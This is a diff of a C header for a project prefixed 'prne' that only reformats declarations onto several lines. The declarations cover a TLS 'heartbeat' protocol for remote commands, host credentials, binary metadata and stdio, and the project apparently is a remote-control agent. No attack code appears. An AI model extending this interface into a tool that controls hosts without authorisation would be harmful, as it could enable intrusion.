@@ -49,8 +49,12 @@ typedef enum {
 	PRNE_IPV_6
 } prne_ipv_t;
 
-prne_static_assert(sizeof(struct in_addr) == 4, "sizeof(struct in_addr) == 4");
-prne_static_assert(sizeof(struct in6_addr) == 16, "sizeof(struct in6_addr) == 16");
+prne_static_assert(
+	sizeof(struct in_addr) == 4,
+	"sizeof(struct in_addr) == 4");
+prne_static_assert(
+	sizeof(struct in6_addr) == 16,
+	"sizeof(struct in6_addr) == 16");
 struct prne_ip_addr {
 	uint8_t addr[16];
 	prne_ipv_t ver;
@@ -261,8 +265,16 @@ struct prne_htbt_stdio {
 typedef void(*prne_htbt_init_ft)(void *ptr);
 typedef void(*prne_htbt_free_ft)(void *ptr);
 typedef bool(*prne_htbt_eq_ft)(const void *a, const void *b);
-typedef prne_htbt_ser_rc_t(*prne_htbt_ser_ft)(uint8_t *mem, const size_t mem_len, size_t *actual, const void *in);
-typedef prne_htbt_ser_rc_t(*prne_htbt_dser_ft)(const uint8_t *data, const size_t len, size_t *actual, void *out);
+typedef prne_htbt_ser_rc_t(*prne_htbt_ser_ft)(
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const void *in);
+typedef prne_htbt_ser_rc_t(*prne_htbt_dser_ft)(
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	void *out);
 
 #define PRNE_HTBT_TLS_ALP			"prne-htbt"
 #define PRNE_HTBT_MSG_ID_MIN		1
@@ -293,64 +305,165 @@ prne_arch_t prne_arch_fstr (const char *str);
 bool prne_arch_inrange (const prne_arch_t x);
 
 bool prne_eq_ipaddr (const prne_ip_addr_t *a, const prne_ip_addr_t *b);
-void prne_net_ep_tosin4 (const prne_net_endpoint_t *ep, struct sockaddr_in *out);
-void prne_net_ep_tosin6 (const prne_net_endpoint_t *ep, struct sockaddr_in6 *out);
-bool prne_net_ep_set_ipv4 (const char *str, const uint16_t port, prne_net_endpoint_t *out);
-bool prne_net_ep_set_ipv6 (const char *str, const uint16_t port, prne_net_endpoint_t *out);
+void prne_net_ep_tosin4 (
+	const prne_net_endpoint_t *ep,
+	struct sockaddr_in *out);
+void prne_net_ep_tosin6 (
+	const prne_net_endpoint_t *ep,
+	struct sockaddr_in6 *out);
+bool prne_net_ep_set_ipv4 (
+	const char *str,
+	const uint16_t port,
+	prne_net_endpoint_t *out);
+bool prne_net_ep_set_ipv6 (
+	const char *str,
+	const uint16_t port,
+	prne_net_endpoint_t *out);
 
 void prne_htbt_init_msg_head (prne_htbt_msg_head_t *mh);
 void prne_htbt_free_msg_head (prne_htbt_msg_head_t *mh);
-bool prne_htbt_eq_msg_head (const prne_htbt_msg_head_t *a, const prne_htbt_msg_head_t *b);
+bool prne_htbt_eq_msg_head (
+	const prne_htbt_msg_head_t *a,
+	const prne_htbt_msg_head_t *b);
 
 void prne_htbt_init_status (prne_htbt_status_t *s);
 void prne_htbt_free_status (prne_htbt_status_t *s);
-bool prne_htbt_eq_status (const prne_htbt_status_t *a, const prne_htbt_status_t *b);
+bool prne_htbt_eq_status (
+	const prne_htbt_status_t *a,
+	const prne_htbt_status_t *b);
 
 void prne_init_host_cred (prne_host_cred_t *hc);
-bool prne_alloc_host_cred (prne_host_cred_t *hc, const uint8_t id_len, const uint8_t pw_len);
+bool prne_alloc_host_cred (
+	prne_host_cred_t *hc,
+	const uint8_t id_len,
+	const uint8_t pw_len);
 void prne_free_host_cred (prne_host_cred_t *hc);
 bool prne_eq_host_cred (const prne_host_cred_t *a, const prne_host_cred_t *b);
-prne_htbt_ser_rc_t prne_enc_host_cred (uint8_t *data, const size_t len, size_t *actual, const prne_host_cred_t *in);
-prne_htbt_ser_rc_t prne_dec_host_cred (const uint8_t *data, const size_t len, prne_host_cred_t *out);
+prne_htbt_ser_rc_t prne_enc_host_cred (
+	uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	const prne_host_cred_t *in);
+prne_htbt_ser_rc_t prne_dec_host_cred (
+	const uint8_t *data,
+	const size_t len,
+	prne_host_cred_t *out);
 
 void prne_htbt_init_host_info (prne_htbt_host_info_t *hi);
-bool prne_htbt_alloc_host_info (prne_htbt_host_info_t *hi, const size_t cred_len);
+bool prne_htbt_alloc_host_info (
+	prne_htbt_host_info_t *hi,
+	const size_t cred_len);
 void prne_htbt_free_host_info (prne_htbt_host_info_t *hi);
-bool prne_htbt_eq_host_info (const prne_htbt_host_info_t *a, const prne_htbt_host_info_t *b);
+bool prne_htbt_eq_host_info (
+	const prne_htbt_host_info_t *a,
+	const prne_htbt_host_info_t *b);
 
 void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd);
-bool prne_htbt_alloc_cmd (prne_htbt_cmd_t *cmd, const size_t argc, const size_t *args_len);
+bool prne_htbt_alloc_cmd (
+	prne_htbt_cmd_t *cmd,
+	const size_t argc,
+	const size_t *args_len);
 bool prne_htbt_set_cmd (prne_htbt_cmd_t *cmd, char **const args);
 void prne_htbt_free_cmd (prne_htbt_cmd_t *cmd);
 bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b);
 
 void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb);
 void prne_htbt_free_bin_meta (prne_htbt_bin_meta_t *nb);
-bool prne_htbt_eq_bin_meta (const prne_htbt_bin_meta_t *a, const prne_htbt_bin_meta_t *b);
+bool prne_htbt_eq_bin_meta (
+	const prne_htbt_bin_meta_t *a,
+	const prne_htbt_bin_meta_t *b);
 
 void prne_htbt_init_hover (prne_htbt_hover_t *ho);
 void prne_htbt_free_hover (prne_htbt_hover_t *ho);
-bool prne_htbt_eq_hover (const prne_htbt_hover_t *a, const prne_htbt_hover_t *b);
-bool prne_htbt_cp_hover (const prne_htbt_hover_t *a, prne_htbt_hover_t *b);
+bool prne_htbt_eq_hover (
+	const prne_htbt_hover_t *a,
+	const prne_htbt_hover_t *b);
+bool prne_htbt_cp_hover (
+	const prne_htbt_hover_t *a,
+	prne_htbt_hover_t *b);
 
 void prne_htbt_init_stdio (prne_htbt_stdio_t *s);
 void prne_htbt_free_stdio (prne_htbt_stdio_t *s);
-bool prne_htbt_eq_stdio (const prne_htbt_stdio_t *a, const prne_htbt_stdio_t *b);
+bool prne_htbt_eq_stdio (
+	const prne_htbt_stdio_t *a,
+	const prne_htbt_stdio_t *b);
 
-prne_htbt_ser_rc_t prne_htbt_ser_msg_head (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_msg_head_t *in);
-prne_htbt_ser_rc_t prne_htbt_ser_status (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_status_t *in);
-prne_htbt_ser_rc_t prne_htbt_ser_host_info (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_host_info_t *in);
-prne_htbt_ser_rc_t prne_htbt_ser_hover (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_hover_t *in);
-prne_htbt_ser_rc_t prne_htbt_ser_cmd (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_cmd_t *in);
-prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_bin_meta_t *in);
-prne_htbt_ser_rc_t prne_htbt_ser_stdio (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_stdio_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_msg_head (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_msg_head_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_status (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_status_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_host_info (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_host_info_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_hover (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_hover_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_cmd (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_cmd_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_bin_meta_t *in);
+prne_htbt_ser_rc_t prne_htbt_ser_stdio (
+	uint8_t *mem,
+	const size_t mem_len,
+	size_t *actual,
+	const prne_htbt_stdio_t *in);
 
-prne_htbt_ser_rc_t prne_htbt_dser_msg_head (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_msg_head_t *out);
-prne_htbt_ser_rc_t prne_htbt_dser_status (uint8_t *data, const size_t len, size_t *actual, prne_htbt_status_t *out);
-prne_htbt_ser_rc_t prne_htbt_dser_host_info (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_host_info_t *out);
-prne_htbt_ser_rc_t prne_htbt_dser_hover (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_hover_t *out);
-prne_htbt_ser_rc_t prne_htbt_dser_cmd (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_cmd_t *out);
-prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_bin_meta_t *out);
-prne_htbt_ser_rc_t prne_htbt_dser_stdio (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_stdio_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_msg_head (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_msg_head_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_status (
+	uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_status_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_host_info (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_host_info_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_hover (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_hover_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_cmd (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_cmd_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_bin_meta_t *out);
+prne_htbt_ser_rc_t prne_htbt_dser_stdio (
+	const uint8_t *data,
+	const size_t len,
+	size_t *actual,
+	prne_htbt_stdio_t *out);
 
-char **prne_htbt_parse_args (char *m_args, const size_t args_size, const size_t add_argc, char **add_args, size_t *argc, const size_t max_args);
+char **prne_htbt_parse_args (
+	char *m_args,
+	const size_t args_size,
+	const size_t add_argc,
+	char **add_args,
+	size_t *argc,
+	const size_t max_args);
